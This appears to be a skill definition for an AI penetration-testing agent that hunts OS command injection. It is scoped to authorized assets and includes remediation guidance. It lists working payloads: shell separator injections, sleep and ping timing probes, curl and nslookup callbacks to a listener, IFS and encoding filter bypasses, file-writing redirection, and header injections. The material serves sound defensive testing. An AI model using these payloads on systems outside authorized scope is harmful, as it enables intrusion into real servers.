---
name: command-injection-hunter
description: "Tests inputs that reach OS shell / process-launching APIs for command injection — metacharacter-based separator injection (`;`, `|`, `&&`, backtick, `$()`), blind time-based / OOB injection, shell-escape bypass (`\\;ls`), output redirection (write to web root), and filename-parameter vectors. Use when the target has admin / diagnostic features (ping, nslookup, disk utility, log viewer), file-processing endpoints that accept paths, or HTTP headers (Referer / User-Agent) that logs process. Produces findings with CWE-78 mapping, harmless-PoC evidence, and parameterized-API remediation. Defensive testing only, against assets listed in .claude/security-scope.yaml — HARMLESS PROBES ONLY."
model: opus
allowed-tools: >
  Read, Grep, Glob, Write(path:.claude/planning/**),
  WebFetch,
  Bash(curl:*), Bash(wget:*), Bash(httpx:*), Bash(ffuf:*),
  Bash(gobuster:*), Bash(nuclei:*), Bash(jq:*), Bash(arjun:*),
  Bash(gf:*), Bash(gau:*), Bash(waybackurls:*),
  Bash(nmap:--script=safe*), Bash(nmap:-sV), Bash(nmap:-Pn),
  Bash(dig:*), Bash(host:*), Bash(whois:*),
  Bash(openssl:s_client*), Bash(openssl:x509*)
metadata:
  version: 1.0.0
  category: security-testing
  subcategory: injection
  authorization_required: true
  tier: T1
  source_methodology: "Guia Estratégico de Injeção de Comandos no Sistema Operacional.md"
  service_affecting: false
  composed_from: []
---

# Command Injection Hunter

## Goal

Test inputs that reach operating-system shell calls for command
injection — flaws that let an attacker break out of the intended
command string and execute arbitrary OS commands as the web
process. This skill implements WSTG-INPV-12 and maps findings to
CWE-78 (Improper Neutralization of Special Elements used in an OS
Command). The goal is to hand the backend team a concrete list of
shell-reaching inputs with harmless PoC evidence and secure-API
(non-shell-invoking) remediation.

## When to Use

- The target has administrative / diagnostic features: ping,
  nslookup, traceroute, disk-usage, log viewer, packet capture UI.
- Endpoints accept path / filename parameters that might reach
  `system()`, `exec()`, `Runtime.exec()`, or equivalent.
- HTTP headers (Referer, User-Agent, X-Forwarded-For) that the
  app logs are processed by downstream shell-based log tooling.
- Application features trigger background tasks or integrate with
  shell-based tools (pandoc, imagemagick, ffmpeg).
- `api-recon` flagged parameters with names like `cmd`, `command`,
  `exec`, `run`, `host`, `ip`, `domain`, `file`, `path`.
- The orchestrator selects this skill after recon surfaces
  diagnostic or admin endpoints.

## When NOT to Use

- For SQL-interpreter injection — use `sqli-hunter`.
- For template-engine injection — use `ssti-hunter` (may lead to
  RCE too, but via template constructs, not shell metacharacters).
- For XXE or deserialization flaws that lead to RCE — use the
  specific class's hunter.
- For file-inclusion / path-traversal that doesn't reach a shell
  — use `path-traversal-hunter`.
- Any asset not listed in `.claude/security-scope.yaml` or whose
  `testing_level` is not `active`.

## Authorization Check (MANDATORY FIRST STEP)

Before ANY outbound activity:

1. Read `.claude/security-scope.yaml`. If the file doesn't exist or
   doesn't parse, halt and report.
2. Confirm the intended target appears in the `assets` list AND
   its `testing_level` is `active`.
3. Command injection confirmation uses ONLY harmless commands
   (`whoami`, `id`, `hostname`, `uname`, `pwd`, `echo "test"`).
   NEVER run payloads that modify state (rm, chmod, DB writes,
   network scans originating from the target), establish
   persistence (cron, ssh-keygen, reverse shells), or exfiltrate
   data at volume (even on in-scope assets, even with
   `destructive_testing: approved`).
4. If RCE is confirmed, STOP at the proof. Do NOT pivot into
   internal reconnaissance, credential dumping, or lateral
   movement. Report and let `harden` drive the fix. This is the
   same post-RCE halt as `ssti-hunter`.
5. For time-based / OOB probes, the OOB listener must be in the
   scope's `oob_listener` allowlist.
6. If the target is ambiguous, write it to
   `.claude/planning/{issue}/SCOPE_QUESTIONS.md` and halt for
   that target only.
7. Log the authorization check to
   `.claude/planning/{issue}/SECURITY_AUDIT.md` Skills Run Log with
   status `running`.

## Inputs

The skill expects the caller to provide:

- `{issue}`: the planning folder name
- `{target}`: the asset identifier from security-scope.yaml
- `{scope_context}`: optional — specific endpoints / parameters
- `{user_a}`: authenticated session if endpoints are behind auth
- `{oob_listener}`: authorized OOB listener URL from scope

## Methodology

### Phase 1: Candidate Parameter Inventory

1. **Identify shell-likely parameters**
   [Bug Bounty Bootcamp, Ch 18, p. 288]

   Do: Read `API_INVENTORY.md` / `ATTACK_SURFACE.md`. Extract
   parameters whose names or endpoints suggest system calls:
   - Network tools: `host`, `ip`, `target`, `domain`, `server`
     (ping / nslookup / traceroute endpoints)
   - Filesystem: `file`, `path`, `filename`, `directory`, `log`
   - Commands: `cmd`, `command`, `exec`, `run`, `action`
   - Media: `url`, `src`, `input`, `output` (often reach
     ffmpeg / imagemagick / pandoc)

   Also check HTTP headers the app reflects (Referer, User-Agent)
   if they're passed to log-processing tools.

   Record: `.claude/planning/{issue}/cmdi-targets.md`.

### Phase 2: Error-Signal Detection

2. **Metacharacter presence probe** [WSTG v4.2, WSTG-INPV-12]

   Do: For each candidate parameter, substitute the value with:
   - `;`, `|`, `&`, `&&`, `||`, `$(...)`, `` `...` ``

   Observe responses for:
   - Differential status (baseline 200 → probe 500)
   - Body change (OS-specific errors: `sh: command not found`,
     `/bin/sh: not found`, `CreateProcess failed`)
   - Reflected metacharacters in responses (suggests insufficient
     sanitization)

   Vulnerable signal: 500 / error body with OS-shell indicators.

   Not-vulnerable signal: Input accepted as data without
   side effects, or clean 400 rejection.

   Record: Per-parameter trigger behavior.

### Phase 3: In-Band Confirmation (Harmless Commands)

3. **Unix separator-injection probes**
   [Bug Bounty Bootcamp, Ch 18, p. 287]

   Do: For each confirmed-sensitive parameter on a Unix target,
   inject:
   ```
   {baseline-value};whoami
   {baseline-value}|whoami
   {baseline-value}&whoami
   {baseline-value}&&whoami
   {baseline-value}`whoami`
   {baseline-value}$(whoami)
   ```

   Vulnerable response: Response contains the current user's name
   (e.g., `www-data`, `apache`, `nginx`, `root`).

   Not-vulnerable response: Literal reflection without execution,
   or rejection.

   Record: FINDING-NNN per confirmed injection. STOP after first
   successful PoC per parameter — don't escalate.

4. **Windows-separator probes** [WAHH, Ch 21, p. 832]

   Do: For Windows-appearing targets, inject:
   ```
   {baseline-value} && whoami
   {baseline-value} || ipconfig
   {baseline-value} & systeminfo
   ```

   Vulnerable response: Windows command output (user name,
   IP config, system info) in response body.

### Phase 4: Blind (No In-Band Output)

5. **Time-based probes** [WAHH, Ch 10, p. 364]

   Do: For injection points where no output appears, inject
   time-delay payloads:
   - Unix: `;sleep 5;`, `|sleep 5`, `` `sleep 5` ``
   - Windows: `& ping -n 6 127.0.0.1`

   Measure baseline vs probe response time. A consistent 5+s delay
   is evidence of injection.

   Vulnerable response: Response takes >5s; baseline <1s. Repeat
   3 times and take median.

   Not-vulnerable response: No difference.

   Record: Timing data per probe.

6. **OOB DNS / HTTP exfil** [Bug Bounty Bootcamp, Ch 18]

   Do: For confirmed-blind injection points, use OOB callback:
   - Unix: `;curl http://{oob_listener}/cmdi-poc`
   - Unix (DNS-only): `;nslookup cmdi-poc.{oob_listener}`

   Vulnerable response: Listener receives a connection from the
   target's IP.

   Not-vulnerable response: No listener hit.

   Record: FINDING-NNN with listener log.

### Phase 5: Sanitizer Bypass Probing

7. **Escape-character bypass** [WAHH, Ch 11, p. 420]

   Do: If the server filters `;` / `|` but forwards `\`, try:
   - `{value}\;whoami`
   - `{value}\|whoami`

   Also test URL-encoded separators:
   - `%3B` (`;`), `%7C` (`|`), `%26` (`&`)
   - Double-URL-encoded: `%253B`
   - Null byte: `%00` (legacy but worth trying)

   Vulnerable response: The escape or encoding is undone by the
   sanitizer; the underlying shell still splits on the unescaped
   character.

   Record: Per-encoding findings.

8. **IFS / space bypass**
   [Bug Bounty Bootcamp, Ch 18, p. 287]

   Do: If spaces are filtered, use shell's Internal Field Separator
   variable or `${IFS}`:
   ```
   ;cat${IFS}/etc/hostname
   ;whoami$IFS
   ;{cat,/etc/hostname}
   ```

   Vulnerable response: Command executes even though spaces were
   filtered.

### Phase 6: Output Redirection (Gated)

9. **Write-to-webroot probe (WITH CAUTION)** [WAHH, Ch 21, p. 832]

   Do: ONLY IF the scope permits this test AND there's a known
   writable location. Try:
   - Unix: `{value};echo cmdi-poc > /tmp/cmdi-poc-test.txt`
   - Windows: `{value} && echo cmdi-poc > C:\Windows\Temp\cmdi-poc.txt`

   Then check the file existence via the target's log viewer or
   a separate read path (do NOT create a new exploit path to find
   it — use existing in-scope read functionality).

   Vulnerable response: The file was created and is readable.

   **Cleanup**: Use a second injection to remove the file, or
   coordinate with platform team. Default behavior: SKIP this
   phase unless scope explicitly permits — time-based + OOB is
   usually sufficient proof.

### Phase 7: Header-Based Injection

10. **Referer / User-Agent probes**
    [Hacking APIs, Ch 12, p. 176]

    Do: If the app logs headers and the logs are processed by
    shell tools (awk / grep / sed pipelines), inject in headers:
    ```
    User-Agent: Mozilla/5.0;whoami
    Referer: https://x.com/;whoami
    X-Forwarded-For: 127.0.0.1 && whoami
    ```

    Vulnerable response: Response or log-viewer output contains
    executed-command results.

    Record: Header-injection-based findings.

## Payload Library

Categories (full set in `references/payloads.md`):

- **Unix separators**: `;`, `|`, `&`, `&&`, `||`, `` ` ` ``, `$()`
- **Windows separators**: `&&`, `||`, `&`
- **Blind time-based**: per-OS `sleep` / `ping` payloads
- **Blind OOB**: per-OS curl / nslookup / wget to OOB host
- **Escape-char bypass**: `\;`, `\|`, `%3B`, `%253B`, `%0a`
- **IFS bypass**: `${IFS}`, `$IFS$9`, `{a,b}` brace expansion
- **Null byte**: `%00` (legacy)
- **Output redirection (gated)**: `> /tmp/...`, `>> /tmp/...`

## Output Format

Findings append to `.claude/planning/{issue}/SECURITY_AUDIT.md` per
the schema in `.claude/skills/_shared/finding-schema.md`.

Specific to this skill:

- **CWE**: CWE-78 (OS Command Injection). For variants: CWE-77
  (generic command injection). CWE-20 for sanitizer bypasses.
- **OWASP**: WSTG-INPV-12. For APIs, API8:2023 (Security
  Misconfiguration) and API8:2019 (Injection). A03:2021
  (Injection).
- **CVSS vectors**: in-band RCE —
  `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`. Blind RCE —
  `...AC:H/C:H/I:H/A:H`. Privilege is set based on what account
  the probe required to reach the endpoint.
- **Evidence**: the exact injection request, the response with
  command output (or the OOB listener log for blind), the
  fingerprinted OS, and the shell context (what command the app
  was trying to build).
- **Remediation framing**: backend engineer. Include:
  - Language-specific secure APIs: PHP `escapeshellarg` + prefer
    native function (`mkdir` instead of `system("mkdir")`);
    Python `subprocess.run([cmd, arg1, arg2])` with list-form
    (no `shell=True`); Node `child_process.execFile` (not
    `exec`); Java `ProcessBuilder` with list-form; Go
    `exec.Command("cmd", "arg")` list-form.
  - Strict input allowlisting (per parameter type — hostname
    regex, IPv4/IPv6 parsers, safe filename charset)
  - Principle of least privilege: run app under low-priv account
    without shell binary on PATH
  - SELinux / AppArmor / containerization to contain breaks

The skill also updates:

- `.claude/planning/{issue}/STATUS.md` — its row under Phase 7: Security
- `.claude/planning/{issue}/SECURITY_AUDIT.md` Skills Run Log

## Quality Check (Self-Review)

Before marking complete, verify:

- [ ] Every in-band finding shows command output or a clear OS
      fingerprint, not just a 500 error
- [ ] Every blind finding includes timing data (3 runs) or an OOB
      listener hit
- [ ] No destructive commands were used — grep the Skills Run Log
      for `rm -`, `chmod`, `DELETE`, network scanning verbs;
      should be zero
- [ ] Any output-redirection files created during testing were
      cleaned up or escalated for cleanup
- [ ] Post-RCE halt was honored — no exploration beyond the
      initial proof (grep the Skills Run Log for a single
      RCE-confirmation per parameter)
- [ ] OOB listener used is in the scope's allowlist
- [ ] Skills Run Log row updated from `running` to `complete` or
      `halted:{reason}`

## Common Issues

- **Reflection mistaken for execution**: The probe string `;whoami`
  appears in the response body but `whoami` wasn't actually
  executed — the app just echoed the input. Confirm execution by
  (a) seeing a real username like `www-data`, not the literal
  `whoami`, or (b) time-based / OOB evidence.

- **Network-induced latency**: Response times fluctuate under
  load. A single 5-second response doesn't prove time-based
  injection. Re-run the probe 3x and compare against a 3-run
  baseline of a clean value; median difference >=4s is the
  threshold.

- **WAF echoes as false positive**: A WAF blocks the injection
  but shows the malicious input in an "Access Denied" error. The
  command didn't execute. Confirm by checking whether the
  response status is from the app or the WAF (different pages
  typically).

- **Command part escape that wasn't the issue**: Some apps
  escape shell metacharacters correctly but pass the FILENAME
  through without validation — file-based injection (`foo.txt
  && whoami`) works even though generic-string injection doesn't.
  Test filename contexts specifically.

- **Host / IP parsing that rejects injection**: If the input is
  a hostname parameter, a good hostname regex (strict RFC 1035)
  already rejects shell metacharacters as invalid. Confirm with
  both a valid hostname and a valid hostname + injection — if
  both work identically, the parser is filtering.

- **Containerized / sandboxed execution**: Command injection
  exists but runs inside a tight container without a shell or
  useful binaries. Severity reduces from Critical to High or
  Medium depending on what the container CAN do. Still file the
  finding.

## References

- `references/payloads.md` — full per-OS per-context payload set
- `references/remediation.md` — language-specific secure-API
  snippets

External:
- WSTG-INPV-12: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- OWASP Command Injection Defense Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html

## Source Methodology

Converted from:
`pentest-agent-development/notebooklm-notes/Guia Estratégico de Injeção de Comandos no Sistema Operacional.md`

Grounded in:
- Bug Bounty Bootcamp, Ch 18 (Command Injection)
- The Web Application Hacker's Handbook, Ch 10 (Attacking Back-End
  Components) + Ch 11 (Attacking Application Logic) + Ch 21
- OWASP WSTG v4.2 (WSTG-INPV-12)
- Hacking APIs, Ch 12 (API Injection)

Conversion date: 2026-04-24
Conversion prompt version: 1.0
